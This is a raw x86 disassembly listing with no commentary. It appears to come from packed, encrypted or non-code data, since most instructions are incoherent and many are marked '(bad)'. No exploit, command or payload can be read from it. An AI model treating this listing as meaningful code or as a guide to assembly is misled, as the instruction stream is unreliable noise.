  415cac:	fisubr WORD PTR [ebp+0x57ed2b3]
  415cb2:	lods   al,BYTE PTR ds:[esi]
  415cb3:	push   0x3d
  415cb5:	and    al,0x36
  415cb7:	jo     0x415cee
  415cb9:	push   eax
  415cba:	inc    esp
  415cbb:	add    BYTE PTR [esi+0x4b],0xfc
  415cbf:	loopne 0x415ce8
  415cc1:	dec    esi
  415cc2:	shr    DWORD PTR [edx+0x238ba223],1
  415cc8:	sub    dl,BYTE PTR [eax+0x57]
  415ccb:	(bad)  
  415ccd:	shl    DWORD PTR [ebp-0x7f982eb3],cl
  415cd3:	inc    ebx
  415cd4:	retf   0xafed
  415cd7:	jo     0x415d2f
  415cd9:	arpl   bp,di
  415cdb:	nop
  415cdc:	hlt    
  415cdd:	mov    al,ds:0x882217f0
  415ce2:	int3   
  415ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ce4:	aaa    
  415ce5:	mov    eax,ds:0x688bf877
  415cea:	sti    
  415ceb:	add    DWORD PTR [esi+0x27],eax
  415cee:	call   0xa635:0x5bc3e16f
  415cf5:	popf   
  415cf6:	mov    esp,0xd203c375
  415cfb:	cmp    bl,BYTE PTR [esi]
  415cfd:	add    al,0x86
  415cff:	pop    ebp
  415d00:	cwde   
  415d01:	push   edx
  415d02:	arpl   WORD PTR [ecx+esi*1+0x5751d9b6],sp
  415d09:	fstp   TBYTE PTR [edx+0x59]
  415d0c:	mov    ebp,0x9861c46a
  415d11:	scas   al,BYTE PTR es:[edi]
  415d12:	aaa    
  415d13:	sub    DWORD PTR [edi+0x77],edi
  415d16:	out    dx,eax
  415d17:	imul   edi,DWORD PTR [edi],0xffffffd2
  415d1a:	repnz xor eax,0x5063de11
  415d20:	sbb    al,BYTE PTR [edx-0x4b788e2]
  415d26:	mul    BYTE PTR [ebx+0x71]
  415d29:	call   0xeef6:0x1e28182
  415d30:	repnz mov esp,0xc846e2c4
  415d36:	inc    ecx
  415d37:	cmp    al,0x87
  415d39:	jg     0x415d7c
  415d3b:	retf   0x4e29
  415d3e:	cmp    dh,cl
  415d40:	into   
  415d41:	icebp  
  415d42:	test   al,0xdf
  415d44:	icebp  
  415d45:	daa    
  415d46:	arpl   WORD PTR [esi+0x2546c9e8],cx
  415d4c:	and    DWORD PTR [ecx-0x60aa49f1],0xffffffef
  415d53:	sbb    esp,DWORD PTR [esi]
  415d55:	test   al,0xd5
  415d57:	xor    ch,dh
  415d59:	mov    al,0x74
  415d5b:	scas   eax,DWORD PTR es:[edi]
  415d5c:	dec    ecx
  415d5d:	inc    esi
  415d5e:	rep stos DWORD PTR es:[edi],eax
  415d60:	dec    eax
  415d61:	mov    ecx,0x2185228c
  415d66:	fwait
  415d67:	mov    ah,0xa7
  415d69:	inc    esp
  415d6a:	scas   eax,DWORD PTR es:[edi]
  415d6b:	in     eax,0x5c
  415d6d:	pop    esi
  415d6e:	xor    bh,0x73
  415d71:	icebp  
  415d72:	sub    edi,DWORD PTR [edx+esi*1]
  415d75:	ret    0x7a66
  415d78:	(bad)  
  415d79:	mov    edi,0xea32523c
  415d7e:	scas   eax,DWORD PTR es:[edi]
  415d7f:	push   0x53
  415d81:	pop    ss
  415d82:	xor    eax,0xfab5a7d9
  415d87:	bound  ebx,QWORD PTR ds:0xed50e09a
  415d8d:	pop    ebp
  415d8e:	loope  0x415dd9
  415d90:	xchg   edx,eax
  415d91:	mov    esp,0xd7a5f089
  415d96:	xchg   ebp,eax
  415d97:	scas   eax,DWORD PTR es:[edi]
  415d98:	nop
  415d99:	dec    ebx
  415d9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d9b:	pusha  
  415d9c:	and    ebx,DWORD PTR [edi+0x2]
  415d9f:	push   esp
  415da0:	cmp    DWORD PTR [ebx],0xb36c31ac
  415da6:	add    BYTE PTR [ecx+0x70],ah
  415da9:	mov    dh,0x42
  415dab:	test   BYTE PTR [ebx-0x1a],cl
  415dae:	push   ebp
  415daf:	inc    esi
  415db0:	sbb    bl,dh
  415db2:	nop
  415db3:	daa    
  415db4:	nop
  415db5:	shl    BYTE PTR [ecx],0xa6
  415db8:	ror    BYTE PTR [edi+0x218b6f1b],0xf5
  415dbf:	xor    edi,ebp
  415dc1:	or     edi,edi
  415dc3:	jns    0x415d7c
  415dc5:	idiv   DWORD PTR [ebx+0x61]
  415dc8:	outs   dx,DWORD PTR ds:[esi]
  415dc9:	fcomp  st(0)
  415dcb:	loopne 0x415d9a
  415dcd:	cs sahf 
  415dcf:	pop    ss
  415dd0:	mov    edi,0xecb61d28
  415dd5:	lods   al,BYTE PTR ds:[esi]
  415dd6:	(bad)
  415ddb:	lods   al,BYTE PTR ds:[esi]
  415ddc:	aad    0x4f
  415dde:	ds jno 0x415de7
  415de1:	sub    esp,DWORD PTR [edi-0x1cf3ce5d]
  415de7:	xchg   bh,bl
  415de9:	dec    esp
  415dea:	or     BYTE PTR ds:0x5eb71390,0x32
  415df1:	mov    cl,0x8a
  415df3:	daa    
  415df4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415df5:	dec    ebx
  415df6:	adc    ecx,esi
  415df8:	hlt    
  415df9:	adc    DWORD PTR [esi+0x18ac932b],esp
  415dff:	loop   0x415dbb
  415e01:	mov    ds:0x3a2bb7d0,al
  415e06:	or     al,0xbf
  415e08:	dec    esp
  415e09:	test   al,0x42
  415e0b:	and    ecx,DWORD PTR [esp+ecx*1+0x63f8e382]
  415e12:	out    dx,al
  415e13:	jbe    0x415e4d
  415e15:	push   ds
  415e16:	jge    0x415df9
  415e18:	jbe    0x415e96
  415e1a:	xor    al,0xfd
  415e1c:	std    
  415e1d:	shr    BYTE PTR [esi],1
  415e1f:	sbb    BYTE PTR [ebx],ch
  415e21:	sub    ah,BYTE PTR [ecx+0x1e]
  415e24:	aaa    
  415e25:	daa    
  415e26:	jns    0x415dc6
  415e28:	bound  ebp,QWORD PTR [ecx-0x2bb7ef93]
  415e2e:	test   BYTE PTR [ecx],al
  415e30:	push   0xffffffea
  415e32:	test   BYTE PTR [eax-0x3c1d872a],ch
  415e38:	mov    ds:0x3d801d3,eax
  415e3d:	mov    DWORD PTR [edi+0x5c],ebp
  415e40:	aas    
  415e41:	fisttp QWORD PTR [eax]
  415e43:	stos   BYTE PTR es:[edi],al
  415e44:	ret    
  415e45:	cmp    eax,0xccc08d0c
  415e4a:	add    bh,ch
  415e4c:	add    al,0x1b
  415e4e:	pop    ecx
  415e4f:	pop    edx
  415e50:	add    edi,ebx
  415e52:	add    eax,0x2748b386
  415e57:	jo     0x415df9
  415e59:	rcr    bh,1
  415e5b:	adc    dh,bl
  415e5d:	xor    al,0x83
  415e5f:	addr16 add cl,cl
  415e62:	ins    DWORD PTR es:[edi],dx
  415e63:	push   edx
  415e64:	push   ebp
  415e65:	neg    BYTE PTR [ebx+edi*2-0x43]
  415e69:	ret    
  415e6a:	sbb    dl,BYTE PTR [ecx+0x45]
  415e6d:	pop    es
  415e6e:	push   ecx
  415e6f:	jnp    0x415eab
  415e71:	dec    ebp
  415e72:	xchg   edi,eax
  415e73:	hlt    
  415e74:	into   
  415e75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e76:	xor    BYTE PTR [edx-0x247d5e99],0xec
  415e7d:	lods   al,BYTE PTR ds:[esi]
  415e7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e7f:	jnp    0x415e25
  415e81:	xor    BYTE PTR [edi+0x73],cl
  415e84:	aaa    
  415e85:	xor    DWORD PTR [ecx+0x48c1f721],ebp
  415e8b:	cmp    cl,BYTE PTR [ebp+0x7fecf764]
  415e91:	ret    0x1e
  415e94:	out    dx,eax
  415e95:	push   0xf80dc5cc
  415e9a:	mov    al,0x54
  415e9c:	xchg   al,dh
  415e9e:	dec    DWORD PTR [edi-0x4f]
  415ea1:	hlt    
  415ea2:	in     al,dx
  415ea3:	mov    al,ds:0xe4d22aed
  415ea8:	(bad)  
  415ea9:	int3   
  415eaa:	mov    bl,0xbc
  415eac:	rcl    DWORD PTR [esi-0x2d37f02f],0x5
  415eb3:	lea    ecx,[ebp+ebx*2+0x52079b8d]
  415eba:	loop   0x415ebc
  415ebc:	xchg   ecx,eax
  415ebd:	xor    edi,DWORD PTR [edx]
  415ebf:	mov    cl,0xb0
  415ec1:	pusha  
  415ec2:	rep lods al,BYTE PTR ds:[esi]
  415ec4:	inc    ebx
  415ec5:	mov    ebx,0xdb546e9c
  415eca:	iret   
  415ecb:	jns    0x415e8f
  415ecd:	ror    BYTE PTR [ebp+0x1f222f04],0x6
  415ed4:	push   ecx
  415ed5:	mov    esp,0x5c7f4087
  415eda:	mov    edx,esi
  415edc:	xchg   esi,eax
  415edd:	shr    ch,1
  415edf:	mov    DWORD PTR [ecx+0x282a306],edi
  415ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ee6:	cdq    
  415ee7:	sub    al,0x73
  415ee9:	mov    dh,0xcf
  415eeb:	sbb    DWORD PTR [ebx-0x3fdc79e0],0x2645d6b
  415ef5:	in     al,0x8b
  415ef7:	jmp    0x415eef
  415ef9:	mov    ecx,0xbb1e4b80
  415efe:	(bad)  
  415eff:	add    al,0x54
  415f01:	sub    al,0xb
  415f03:	(bad)  
  415f04:	xor    eax,0x45bf1552
  415f09:	(bad)  
  415f0a:	and    BYTE PTR [esi-0x2604ac47],bl
  415f10:	jo     0x415f5e
  415f12:	sbb    eax,0xa17b4008
  415f17:	jne    0x415f0b
  415f19:	or     bh,ch
  415f1b:	test   eax,0xef23898d
  415f20:	arpl   si,di
  415f22:	mov    bh,0xb3
  415f24:	jg     0x415eaa
  415f26:	int3   
  415f27:	xor    DWORD PTR [edi-0x62],ecx
  415f2a:	xor    dh,bh
  415f2c:	in     al,dx
  415f2d:	and    eax,0x2ccd10d9
  415f32:	cmp    esp,ecx
  415f34:	stos   DWORD PTR es:[edi],eax
  415f35:	in     al,dx
  415f36:	ret    
  415f37:	iret   
  415f38:	out    0x6,eax
  415f3a:	les    eax,FWORD PTR [eax]
  415f3c:	(bad)  
  415f3e:	or     eax,0xa8376ee4
  415f43:	or     BYTE PTR [ecx+0x7e335105],0x1d
  415f4a:	inc    esp
  415f4b:	add    al,0xf1
  415f4d:	or     edx,ecx
  415f4f:	pop    ebx
  415f50:	retf   0xd874
  415f53:	aad    0xef
  415f55:	shl    DWORD PTR [ebp-0x124cee64],0x93
  415f5c:	inc    ecx
  415f5d:	fisttp WORD PTR [esi]
  415f5f:	and    edi,DWORD PTR [ecx+0x66]
  415f62:	cs pop esi
  415f64:	add    cl,ah
  415f66:	xchg   ebp,ebx
  415f68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f69:	or     edx,DWORD PTR [eax]
  415f6b:	xor    edi,esp
  415f6d:	sub    edi,DWORD PTR ds:0x4630551b
  415f73:	jne    0x415fb9
  415f75:	mov    ecx,0x420114a4
  415f7a:	mov    es,WORD PTR [edi+esi*1-0x4f]
  415f7e:	jae    0x415fab
  415f80:	aad    0x74
  415f82:	cdq    
  415f83:	sub    DWORD PTR [edi],edx
  415f85:	jmp    0x91f8:0x2c4c747a
  415f8c:	(bad)
  415f8f:	sar    BYTE PTR [ebp-0x10],0x2d
  415f93:	lods   eax,DWORD PTR ds:[esi]
  415f94:	sub    eax,0xd773b3e4
  415f99:	sub    ebp,DWORD PTR [edx]
  415f9b:	dec    ebp
  415f9c:	cld    
  415f9d:	push   esp
  415f9e:	jb     0x415f4a
  415fa0:	xchg   edx,eax
  415fa1:	push   ds
  415fa2:	cmp    ecx,DWORD PTR [eax+eiz*2]
  415fa5:	cwde   
  415fa6:	in     al,0x1a
  415fa8:	(bad)  
  415faa:	(bad)  
  415fab:	aam    0xba
  415fad:	sbb    eax,0xc502eab4
  415fb2:	icebp  
  415fb3:	aaa    
  415fb4:	xchg   ebp,eax
  415fb5:	lds    ecx,FWORD PTR [ecx]
  415fb7:	jg     0x415fc4
  415fb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fba:	(bad)  [ecx+0x329457dd]
  415fc0:	idiv   DWORD PTR [edx]
  415fc2:	fcomp  DWORD PTR [ebp+edi*4+0x24]
  415fc6:	cli    
  415fc7:	stos   BYTE PTR es:[edi],al
  415fc8:	ins    DWORD PTR es:[edi],dx
  415fc9:	jg     0x415f70
  415fcb:	pop    ebp
  415fcc:	shr    DWORD PTR [esi+0x617375dd],cl
  415fd2:	sub    BYTE PTR [edx+0x6e7af498],bl
  415fd8:	push   0x69bf5737
  415fdd:	stos   DWORD PTR es:[edi],eax
  415fde:	lods   al,BYTE PTR ds:[esi]
  415fdf:	cwde   
  415fe0:	or     DWORD PTR [edx+0x3c],0xffffff90
  415fe4:	aam    0xb
  415fe6:	fldenv [ebx+0x4d6bd2a8]
  415fec:	fistp  QWORD PTR [ecx-0x66144fee]
  415ff2:	mov    esi,0xf7062054
  415ff7:	inc    ecx
  415ff8:	add    al,0x9b
  415ffa:	data16 mov bl,0xac
  415ffd:	mov    BYTE PTR [eax+0x1b],ah
  416000:	push   edx
  416001:	or     BYTE PTR [ebx+0x2da6aba4],0xff
  416008:	daa    
  416009:	adc    eax,0x1fc8761
  41600e:	inc    ebp
  41600f:	push   cs
  416010:	jno    0x415fd3
  416012:	inc    eax
  416013:	into   
  416014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416015:	ins    BYTE PTR es:[edi],dx
  416016:	lock scas al,BYTE PTR es:[edi]
  416018:	push   ss
  416019:	repz dec edi
  41601b:	or     ecx,ebp
  41601d:	(bad)  
  41601e:	sub    DWORD PTR [edi],ebx
  416020:	cmp    eax,0xb6a94599
  416025:	push   0xffffff89
  416027:	nop
  416028:	cmp    dh,dh
  41602a:	(bad)  
  41602b:	and    bl,BYTE PTR [eax+0x18]
  41602e:	jo     0x415ff3
  416030:	cmc    
  416031:	sub    al,0xd2
  416033:	adc    edx,DWORD PTR [edi]
  416035:	jmp    0xd010:0x3885f80e
  41603c:	sbb    ebp,DWORD PTR [ebx]
  41603e:	cmp    ch,BYTE PTR [edi+edi*1-0x2]
  416042:	out    dx,eax
  416043:	xor    DWORD PTR [ebp+0x4f],edx
  416046:	in     ax,dx
  416048:	loop   0x41603b
  41604a:	retf   0x5bfb
  41604d:	mov    edi,0xdb863d1c
  416052:	push   ds
  416053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416054:	cmp    BYTE PTR [esi],al
  416056:	add    bx,WORD PTR [edi-0x32a2d6b]
  41605d:	dec    bx
  41605f:	push   edx
  416060:	pop    ecx
  416061:	out    0xd2,al
  416063:	sub    dh,BYTE PTR [edi-0x558cd886]
  416069:	addr16 shl edi,cl
  41606c:	sbb    BYTE PTR [ecx-0x2a],0x57
  416070:	sub    DWORD PTR [eax],ebx
  416072:	xlat   BYTE PTR ds:[ebx]
  416073:	sahf   
  416074:	clc    
  416075:	xchg   ecx,eax
  416076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416077:	(bad)  
  416078:	sbb    dh,bl
  41607a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41607b:	ret    
  41607c:	test   al,0x58
  41607e:	lea    edx,[eax-0x42b80e6f]
  416084:	mov    edi,0x9728bb84
  416089:	or     edx,edi
  41608b:	out    0x7d,eax
  41608d:	outs   dx,DWORD PTR ds:[esi]
  41608e:	sub    edi,edx
  416090:	inc    ebx
  416091:	add    BYTE PTR [eax-0x6d3fc6b6],0xac
  416098:	sub    BYTE PTR [esi],bl
  41609a:	mov    ecx,0x35c97a21
  41609f:	push   edi
  4160a0:	adc    BYTE PTR [ecx-0x4771b616],ch
  4160a6:	push   esp
  4160a7:	pop    esp
  4160a8:	jp     0x416031
  4160aa:	jns    0x4160b1
  4160ac:	mov    eax,ds:0x409d8a2f
  4160b1:	cld    
  4160b2:	dec    esp
  4160b3:	jne    0x4160ad
  4160b5:	nop
  4160b6:	mov    ebp,0xbb08119
  4160bb:	pusha  
  4160bc:	cmp    BYTE PTR [ebp-0x1d],ah
  4160bf:	fcom   DWORD PTR [ebp-0x7c]
  4160c2:	inc    ebx
  4160c4:	pop    ecx
  4160c5:	js     0x4160f6
  4160c7:	add    cl,ah
  4160c9:	dec    esi
  4160ca:	ja     0x4160be
  4160cc:	jae    0x416064
  4160ce:	loopne 0x41613f
  4160d0:	loope  0x4160e6
  4160d2:	mov    cl,0x56
  4160d4:	add    dh,BYTE PTR [edx-0x4d685376]
  4160da:	or     DWORD PTR [eax-0x3],eax
  4160dd:	ds mov ebx,0x81c7fb1b
  4160e3:	xor    BYTE PTR [ebp+0x57],0x36
  4160e7:	cwde   
  4160e8:	enter  0x6582,0x7a
  4160ec:	call   0x9a80:0x326b24c2
  4160f3:	pop    es
  4160f4:	in     eax,dx
  4160f5:	xor    eax,0x5112efa2
  4160fa:	jge    0x41611c
  4160fc:	pop    ds
  4160fd:	or     ch,BYTE PTR [edx+0x2707a21e]
  416103:	ds icebp 
  416105:	or     eax,DWORD PTR [eax+0x60]
  416108:	adc    eax,0xd7c29fe4
  41610d:	in     eax,0xdf
  41610f:	xor    ch,BYTE PTR [ecx+edx*1]
  416112:	aam    0xfd
  416114:	dec    ebx
  416115:	out    dx,eax
  416116:	idiv   BYTE PTR [ebp+0x1d6329eb]
  41611c:	sub    ah,BYTE PTR [edi+edi*2-0xe]
  416120:	xchg   ebp,eax
  416121:	push   ebp
  416122:	jnp    0x41617d
  416124:	mov    fs,WORD PTR [ebp-0x14cec7c7]
  41612a:	call   0x3b74:0x127e2dbc
  416131:	inc    ebp
  416132:	pop    edx
  416133:	daa    
  416134:	lahf   
  416135:	aaa    
  416136:	fmul   DWORD PTR [eax]
  416138:	add    DWORD PTR [esi-0x73e58cfd],edx
  41613e:	dec    esi
  41613f:	xchg   edx,eax
  416140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416141:	hlt    
  416142:	mov    dh,0x29
  416144:	and    edi,DWORD PTR [esi]
  416146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416147:	imul   edi,DWORD PTR [edi+0x38989ee8],0xbf5b58a0
  416151:	mov    edx,0xefc452c9
  416156:	xchg   esi,eax
  416157:	popa   
  416158:	rcl    DWORD PTR [edx-0x6f],1
  41615b:	push   ebp
  41615c:	stos   BYTE PTR es:[edi],al
  41615d:	stos   DWORD PTR es:[edi],eax
  41615e:	xor    al,0x3c
  416160:	ficom  DWORD PTR [edx]
  416162:	add    DWORD PTR [edi],ebp
  416164:	xor    edx,DWORD PTR [eiz*2-0x4ce058d]
  41616b:	lds    ebp,FWORD PTR [edi-0x3f]
  41616e:	ins    BYTE PTR es:[edi],dx
  41616f:	mov    dl,dl
  416171:	je     0x4161d9
  416173:	repz pop esi
  416175:	retf   
  416176:	xchg   ecx,eax
  416177:	cs mov edx,0xa562f7a0
  41617d:	shld   esp,eax,0x76
  416181:	add    DWORD PTR [esi-0x7ce3ff4c],esp
  416187:	aad    0xa3
  416189:	out    dx,al
  41618a:	push   ebp
  41618b:	repnz xor eax,0x8c52f202
  416191:	cmc    
  416192:	jbe    0x41611e
  416194:	xchg   esp,eax
  416195:	aas    
  416196:	push   ds
  416197:	scas   al,BYTE PTR es:[edi]
  416198:	popf   
  416199:	push   0x79
  41619b:	(bad)  
  41619c:	pop    ecx
  41619d:	leave  
  41619e:	ins    DWORD PTR es:[di],dx
  4161a0:	mov    ecx,0x92564846
  4161a5:	shl    DWORD PTR [ecx-0x9],0xc3
  4161a9:	leave  
  4161aa:	inc    esi
  4161ab:	and    BYTE PTR [ecx-0x5c],dh
  4161ae:	jecxz  0x416151
  4161b0:	ret    
  4161b1:	xchg   esi,eax
  4161b2:	fld    DWORD PTR [esi]
  4161b4:	inc    ebx
  4161b5:	enter  0x5ea8,0xe4
  4161b9:	sbb    bl,BYTE PTR [esi+0x4f81ad6c]
  4161bf:	(bad)  
  4161c0:	xchg   edi,eax
  4161c1:	fiadd  WORD PTR [edi+0x1ce625c4]
  4161c7:	inc    edx
  4161c8:	push   edx
  4161c9:	ins    BYTE PTR es:[edi],dx
  4161ca:	hlt    
  4161cb:	bound  ebp,QWORD PTR ds:[esi-0x14]
  4161cf:	pop    ss
  4161d0:	add    edi,ecx
  4161d2:	push   edi
  4161d3:	data16 out dx,al
  4161d5:	xchg   ebp,eax
  4161d6:	sub    BYTE PTR [ebx+0x46],dl
  4161d9:	xor    BYTE PTR [eax+ecx*1],al
  4161dc:	push   esp
  4161dd:	push   es
  4161de:	mov    ebp,0x486ac3bc
  4161e3:	ins    DWORD PTR es:[edi],dx
  4161e4:	ja     0x416172
  4161e6:	aad    0x36
  4161e8:	adc    al,0x58
  4161ea:	scas   eax,DWORD PTR es:[edi]
  4161eb:	jg     0x41617c
  4161ed:	dec    esp
  4161ee:	nop
  4161ef:	pop    ebx
  4161f0:	into   
  4161f1:	jle    0x41626a
  4161f3:	mov    ds:0xbfbbd3a3,eax
  4161f8:	loop   0x41624f
  4161fa:	out    dx,eax
  4161fb:	mov    ds:0xd25352c4,eax
  416200:	test   al,0x96
  416202:	pop    esi
  416203:	add    al,0x38
  416205:	lds    ebp,FWORD PTR [ebx-0x644182be]
  41620b:	xchg   edx,eax
  41620c:	sub    eax,0x325c9e7a
  416211:	pop    esi
  416212:	ja     0x416234
  416214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416215:	mov    edx,0x73db0e5e
  41621a:	in     al,0x1d
  41621c:	push   0x0
  41621e:	ja     0x416207
  416220:	jns    0x416206
  416222:	inc    esp
  416223:	pop    ebx
  416224:	dec    edx
  416225:	fstp   DWORD PTR [ecx-0x57a16893]
  41622b:	mov    ebx,0xd7ddd585
  416230:	xor    ah,bh
  416232:	pop    edx
  416233:	ficomp WORD PTR [ebx]
  416235:	push   ss
  416236:	call   0x329139cc
  41623b:	mov    ch,0xbe
  41623d:	bound  eax,QWORD PTR [esi*8+0x719f2b38]
  416244:	jmp    0xfb2a:0xd9f89582
  41624b:	add    ebp,DWORD PTR [ebx+0x1b]
  41624e:	dec    esi
  41624f:	mov    WORD PTR ds:0x9ba93ce3,es
  416255:	iret   
  416256:	sub    cl,BYTE PTR [edi]
  416258:	mov    ecx,0x17395c65
  41625d:	mov    edi,0x8d20cf9d
  416262:	imul   edx,esp,0xffffffeb
  416265:	and    al,0x2
  416267:	fnstcw WORD PTR [edx+0x16]
  41626a:	jno    0x416275
  41626c:	sar    BYTE PTR [ecx+0x20382088],1
  416272:	aaa    
  416273:	push   eax
  416274:	xchg   ecx,eax
  416275:	add    BYTE PTR [edi+0x35596477],bh
  41627b:	inc    eax
  41627c:	fs das 
  41627e:	and    DWORD PTR [edi],edi
  416280:	pcmpeqd mm3,QWORD PTR fs:[eax]
  416284:	push   edx
  416285:	sahf   
  416286:	jmp    0xc298:0xf75a92be
  41628d:	ret    0x8977
  416290:	and    esp,ecx
  416292:	fwait
  416293:	push   ss
  416294:	leave  
  416295:	mov    BYTE PTR [ebx+0x19],ah
  416298:	data16 test al,0x66
  41629b:	call   0x9ba8:0x7db5ed46
  4162a2:	mov    bl,0xed
  4162a4:	ds leave 
  4162a6:	adc    BYTE PTR [ebp-0x5fde7c38],dh
  4162ac:	pop    edx
  4162ad:	adc    al,0xde
  4162af:	and    al,bh
  4162b1:	push   edx
  4162b2:	pop    edx
  4162b3:	cmp    eax,0x911b8f95
  4162b8:	cmp    bh,BYTE PTR [esi+0x24680c2f]
  4162be:	push   ecx
  4162bf:	idiv   DWORD PTR [ecx+0x14cc3265]
  4162c5:	std    
  4162c6:	pop    ecx
  4162c7:	mov    eax,ds:0xdc064f96
  4162cc:	cld    
  4162cd:	mov    eax,0x28ba49ee
  4162d2:	dec    ebx
  4162d3:	loop   0x416343
  4162d5:	or     eax,0x7429257f
  4162da:	jno    0x4162c6
  4162dc:	mov    eax,ds:0x1b04bd8c
  4162e1:	ss mov ebp,0xaa3c7da
  4162e7:	push   esi
  4162e8:	mov    ecx,0xa18d352d
  4162ed:	pop    ecx
  4162ee:	inc    eax
  4162ef:	dec    esi
  4162f0:	or     al,0xd6
  4162f2:	jge    0x416279
  4162f4:	scas   al,BYTE PTR es:[edi]
  4162f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162f6:	push   es
  4162f7:	cmp    BYTE PTR [ecx-0x2034fdb2],cl
  4162fd:	stos   DWORD PTR es:[edi],eax
  4162fe:	or     al,0xbc
  416300:	add    cl,BYTE PTR [ecx+0x2e]
  416303:	imul   eax,DWORD PTR [edx+0x598b7644],0xffffff9d
  41630a:	cmp    al,0x8c
  41630c:	push   ebx
  41630d:	mov    esp,esp
  41630f:	inc    ebp
  416310:	enter  0x2a04,0x47
  416314:	(bad)  
  416315:	dec    esp
  416316:	sbb    eax,ecx
  416318:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416319:	fs pop edx
  41631b:	daa    
  41631c:	inc    eax
  41631d:	aad    0x55
  41631f:	mov    eax,0xa179f70
  416324:	cmp    DWORD PTR [edx],0x421ad4a0
  41632a:	jmp    0x26f9a0a5
  41632f:	ins    DWORD PTR es:[edi],dx
  416330:	pop    ebx
  416331:	jle    0x4162c4
  416333:	push   esi
  416334:	stos   DWORD PTR es:[edi],eax
  416335:	push   edi
  416336:	push   ebp
  416337:	mov    cl,0x17
  416339:	xacquire xchg DWORD PTR ds:0x7b63745a,eax
  416340:	sahf   
  416341:	jbe    0x41637a
  416343:	cwde   
  416344:	jns    0x4162cd
  416346:	xchg   edx,eax
  416347:	sub    eax,0x7228f3a3
  41634c:	jge    0x416336
  41634e:	xchg   edx,edi
  416350:	ins    BYTE PTR es:[edi],dx
  416351:	cmp    ebx,ebp
  416353:	inc    edx
  416354:	jno    0x4163bd
  416356:	lahf   
  416357:	dec    ebp
  416358:	cmc    
  416359:	or     ecx,ecx
  41635b:	push   ss
  41635c:	push   ebp
  41635d:	pop    edi
  41635e:	aam    0x4
  416360:	es mov ebx,0x186d7eb9
  416366:	xor    dh,BYTE PTR [ebp-0x17d6d089]
  41636c:	fwait
  41636d:	inc    esi
  41636e:	xor    eax,DWORD PTR [ebx-0x43286dec]
  416374:	and    DWORD PTR [esi],ebx
  416376:	sbb    eax,0x1962481b
  41637b:	xchg   esp,edi
  41637d:	mov    dl,0x64
  41637f:	xchg   ebx,eax
  416380:	shr    BYTE PTR [edi-0x60892947],1
  416386:	bound  edi,QWORD PTR [ecx+esi*4-0x56373432]
  41638d:	je     0x4163cf
  41638f:	cmp    al,0xae
  416391:	sbb    dl,dh
  416393:	rcr    DWORD PTR [ecx+0x26e8e11],0x19
  41639a:	bound  edi,QWORD PTR [esi]
  41639c:	fstp   DWORD PTR [eax]
  41639e:	mov    ds:0x45441f22,al
  4163a3:	push   edi
  4163a4:	xor    esp,DWORD PTR [edi]
  4163a6:	fisttp WORD PTR [ebx-0x4a]
  4163a9:	mov    ?,WORD PTR [edx]
  4163ab:	sbb    eax,0xf509288e
  4163b0:	mov    bh,0xcc
  4163b2:	fistp  WORD PTR [esi+0x125c4c57]
  4163b8:	(bad)  
  4163b9:	push   edx
  4163ba:	push   ds
  4163bb:	jp     0x416418
  4163bd:	repnz (bad) 
  4163bf:	mov    edx,0xc878cc00
  4163c4:	lds    ecx,FWORD PTR [ebx]
  4163c6:	repnz dec eax
  4163c8:	mov    edx,0x91fe9450
  4163cd:	scas   al,BYTE PTR es:[edi]
  4163ce:	push   ss
  4163cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163d0:	clc    
  4163d1:	cdq    
  4163d2:	push   0xffffff83
  4163d4:	stos   BYTE PTR es:[edi],al
  4163d5:	in     eax,dx
  4163d6:	cdq    
  4163d7:	mov    esp,0x5e54457a
  4163dc:	mov    DWORD PTR [edx+0x1ac0533a],edx
  4163e2:	mov    cl,0xf3
  4163e4:	sbb    BYTE PTR [eax-0x6f579f3f],bh
  4163ea:	pop    es
  4163eb:	ds xor eax,0xd91458c4
  4163f1:	cmp    edi,DWORD PTR [ebx-0xff019a6]
  4163f7:	add    ch,BYTE PTR [edi-0x1f21a0dd]
  4163fd:	jb     0x416479
  4163ff:	mov    ds:0xe964d098,al
  416404:	push   cs
  416405:	pushf  
  416406:	mov    edx,DWORD PTR [esi]
  416408:	dec    eax
  416409:	leave  
  41640a:	jge    0x4163be
  41640c:	mov    al,ds:0xcd4f3292
  416411:	ja     0x4163f2
  416413:	ds jne 0x416470
  416416:	js     0x4163dc
  416418:	pop    ds
  416419:	mov    ds:0xd906d894,eax
  41641e:	jl     0x41647a
  416420:	xor    al,0x11
  416422:	and    edx,DWORD PTR [esi]
  416424:	jl     0x416446
  416426:	(bad)
  416429:	inc    esp
  41642a:	mov    bl,0xa8
  41642c:	stos   DWORD PTR es:[edi],eax
  41642d:	xor    al,0x54
  41642f:	(bad)  
  416430:	icebp  
  416431:	jbe    0x4163cb
  416433:	mov    esi,0x9e9b8e62
  416438:	scas   al,BYTE PTR es:[edi]
  416439:	gs add al,0xef
  41643c:	xchg   ebx,eax
  41643d:	adc    ch,ah
  41643f:	ds sub eax,0x3fc3860f
  416445:	gs daa 
  416447:	pop    ss
  416448:	xchg   BYTE PTR [edi+0x73],bl
  41644b:	std    
  41644c:	or     eax,0x9a45879f
  416451:	fwait
  416452:	imul   esi,DWORD PTR [ebp+0x55],0x46
  416456:	and    eax,0x3886f870
  41645b:	rcl    BYTE PTR [ebx],0xb2
  41645e:	pop    ebx
  416460:	jno    0x41643f
  416462:	xchg   BYTE PTR [edx+0x1a],al
  416465:	jno    0x41643e
  416467:	cmp    DWORD PTR [ebx+0x2de8dbd8],edi
